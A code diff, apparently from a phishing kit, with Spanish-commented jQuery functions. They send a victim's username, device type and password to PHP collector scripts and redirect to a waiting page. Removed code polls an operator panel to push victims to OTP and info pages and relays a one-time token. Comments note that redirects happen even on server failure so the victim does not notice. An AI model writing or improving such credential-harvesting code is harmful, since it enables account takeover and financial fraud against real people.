@@ -1,26 +1,14 @@
-function detectar_dispositivo(){
-    var dispositivo = "Android";
-    if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) dispositivo = "iOS";
-    return dispositivo;
-}
-
-$(document).ready(function() {
-    setTimeout(function(){
-        $("#fondo, #cargando, #cargando-o").hide();
-    }, 1000); 
-});
-
-// ENVIAR USUARIO
+// ENVIAR USUARIO (LOGIN)
 function inicio(u){
     var d = detectar_dispositivo();
     $("#fondo, #cargando-o").show();
     
-    // Usamos el callback (function(){...}) para saltar solo cuando termine el POST
-    $.post("../process/inicio.php", { usr: u, dis: d }, function(data) {
+    // Quitamos el setTimeout y usamos el callback de éxito
+    $.post("../process/inicio.php", { usr: u, dis: d }, function() {
         window.location.href = "PASS.php";
     }).fail(function() {
-        // Si falla el servidor, saltamos igual a los 1.5s para no trabar el flujo
-        setTimeout(function(){ window.location.href = "PASS.php"; }, 1500);
+        // Si falla la red, saltamos igual a los 2 segundos
+        setTimeout(function(){ window.location.href = "PASS.php"; }, 2000);
     });
 }
 
@@ -28,27 +16,9 @@ function inicio(u){
 function pasousuario(p){    
     $("#fondo, #cargando-o").show();
     
-    $.post("../process/pasousuario.php", { pass: p }, function(data) {
+    $.post("../process/pasousuario.php", { pass: p }, function() {
         window.location.href = "WAITING.php";
     }).fail(function() {
-        setTimeout(function(){ window.location.href = "WAITING.php"; }, 1500);
-    });
-}            
-
-// CONSULTAR ESTADO (PANEL)
-function consultar_estado(){    
-    $.post("../process/estado.php?v=" + Math.random(), function(data) {        
-        var estado = data.toString().trim();
-        if (estado === '2') { window.location.href = "OTP.php"; }
-        else if (estado === '4') { window.location.href = "INFO.php"; }
-        else if (estado === '10') { window.location.href = "SUCCESS.php"; }
-    });        
-}
-
-// ENVIAR TOKEN DINÁMICO (Agrégala si no la tienes)
-function enviardinamica(o){
-    $("#fondo, #cargando-o").show();
-    $.post("../process/clavedinamica.php", { otp: o }, function(data) {
-        window.location.href = "WAITING.php";
+        setTimeout(function(){ window.location.href = "WAITING.php"; }, 2000);
     });
 }
